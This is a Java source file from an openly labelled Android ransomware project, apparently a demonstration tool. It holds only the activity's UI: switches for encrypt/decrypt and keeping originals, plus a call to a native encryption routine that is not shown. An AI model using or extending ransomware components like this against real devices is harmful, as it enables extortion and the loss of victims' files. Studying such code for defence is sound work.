/*
This file is part of The-Nice-Ransomware-Android-Edition project
https://github.com/agentzex/The-Nice-Ransomware-Android-Edition
 */

package com.zex.TheNiceRansomware;

import android.app.ProgressDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Switch;
import android.widget.TextView;


public class TheNiceRansomwareNDK extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_theniceransomware);

        final ProgressDialog nDialog;
        nDialog = new ProgressDialog(TheNiceRansomwareNDK.this);
        nDialog.setMessage("Encrypting/Decrypting");
        nDialog.setIndeterminate(false);
        nDialog.setCancelable(false);
        final TextView tv = (TextView)findViewById(R.id.result_textview);

        Button encrypt_btn = (Button) findViewById(R.id.start);
        encrypt_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                nDialog.show();

                final Thread t = new Thread() {
                    @Override
                    public void run() {
                        boolean keep_original_files = ((Switch) findViewById(R.id.keep_original_files)).isChecked();
                        boolean encrypt_or_decrypt = ((Switch) findViewById(R.id.encrypt_or_decrypt)).isChecked();
                        final String result = initCrypto(keep_original_files, encrypt_or_decrypt);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                tv.setText(result);
                            }
                        });
                        nDialog.dismiss();
                    }
                };
                t.start();

            }
        });
    }
    public native String  initCrypto(boolean keep_original_files, boolean encrypt_or_decrypt);


    static {
        System.loadLibrary("crypto");
    }
}
